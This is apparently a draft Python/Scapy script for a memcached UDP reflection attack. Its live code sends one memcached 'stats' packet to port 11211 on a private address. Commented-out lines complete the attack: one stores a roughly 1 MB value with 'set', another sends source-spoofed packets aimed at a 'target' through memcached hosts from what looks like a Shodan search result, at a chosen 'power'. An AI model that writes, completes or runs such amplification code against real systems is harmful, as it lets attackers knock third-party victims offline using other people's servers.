#!/usr/bin/env python3
#-*- coding:utf-8 -*-

from scapy.all import *

#data = "\x00\x00\x00\x00\x00\x01\x00\x00set a 0 0 1048501" + "\r\n" + 'a' * 1048 + "\r\n"

data="\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"

# d e f g h i j k l m n o p q r s t u v w x y z
#send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)

pkt = IP(dst="192.168.1.101") / UDP(sport=12312,dport=11211) / Raw(load=data)

print('ready send...')
send(pkt, inter=1, count=1)
print('send seccuss...')
